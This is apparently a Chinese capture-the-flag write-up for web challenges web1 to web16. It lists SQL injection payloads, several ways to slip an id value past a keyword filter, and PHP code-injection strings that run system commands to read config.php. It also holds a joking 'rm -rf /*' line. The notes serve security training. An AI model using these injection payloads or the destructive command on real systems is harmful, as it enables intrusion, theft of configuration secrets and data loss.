# web1
sql注入漏洞
```
select * from article where id = -1 union select * from article where id=1000 order by id limit 1
```
-1前一条select无结果，否则输出前一条的结果而不是后一条的结果。
也可
```
select * from article where id=1 or id=1000 --
```
--在sql中为注释符

# web2-7
"/or|+/i" or和+号，/i表示不区分大小写

各种解法
```
?id=CAST(0x339 AS INT)
?id=2 || id = 1000
?id=125*8
?id="1000"
?id=~~1000
?id=/**/1000
?id=0b1111101000
?id=0x3e8
?id=round(999.9)
(div)?id=500 div 0.5
```



# web8
猜密码，一顿操作，去埃塞尔比亚==程序员删库跑路
rm -rf /*

# web9
```
/?c=highlight_file("./config.php");
/?c=system('cat config.php');//结果显示在源码上，不在页面上
```

# web10
passthru() , print_r(file()) ,echo 'tac config.php'
```
/?c=print_r(file("config.php"));
/?c=echo `tac config.php`;
```

# web13
?>用于闭合前面的?,可以不用;
```
/?c=echo `tac config.php`?>
```
config.php中定义了$flag,因此可以直接echo $flag

# web 16
md5解密